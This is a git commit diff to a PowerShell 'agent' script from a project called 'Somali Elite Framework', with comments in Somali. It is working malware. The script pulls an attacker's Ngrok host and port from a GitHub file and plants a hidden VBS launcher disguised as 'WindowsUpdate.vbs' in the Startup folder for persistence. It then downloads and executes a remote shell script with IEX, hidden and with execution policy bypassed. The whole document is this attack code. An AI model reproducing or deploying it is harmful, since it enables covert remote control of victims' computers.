2e999b4c414ebac956a65e11af795c53198e25f4
KHAPIIP <127144266+KHAPIIP@users.noreply.github.com>
2026-05-07 22:10:07 -0800

    Update agent.ps1

--- agent.ps1
+++ agent.ps1
@@ -1,15 +1,17 @@
-# Somali Elite Framework - Global Persistence Agent
-# Author: Eng Khapiip
+# Somali Elite Framework - Smart Agent
+$CONN_URL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/connection.txt"
+$GITHUB_SHELL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/shell.ps1"
 
-$HOST_NAME = "khapiip-elite.ddns.net" 
-$GITHUB_URL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/shell.ps1"
+# 1. Soo aqri cinwaanka Ngrok ee uu Python-kaagu hadda u soo diray GitHub
+$RAW_DATA = (New-Object Net.WebClient).DownloadString($CONN_URL).Trim()
+$HOST_NAME = $RAW_DATA.Split(":")[0]
+$PORT = $RAW_DATA.Split(":")[1]
 
-# 1. Abuuri Persistence (Startup Folder) si uusan marnaba u bixin
+# 2. Persistence (Startup Folder)
 $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs"
-$cmd = "powershell -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$GITHUB_URL')"
+$cmd = "powershell -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$GITHUB_SHELL')"
 $vbs = 'Set objShell = WScript.CreateObject("WScript.Shell")' + "`n" + "objShell.Run ""$cmd"", 0"
-
 Set-Content -Path $path -Value $vbs
 
-# 2. Hadda si toos ah u kici Shell-ka
-IEX(New-Object Net.WebClient).DownloadString($GITHUB_URL)
+# 3. Kici Shell-ka rasmiga ah
+IEX(New-Object Net.WebClient).DownloadString($GITHUB_SHELL)
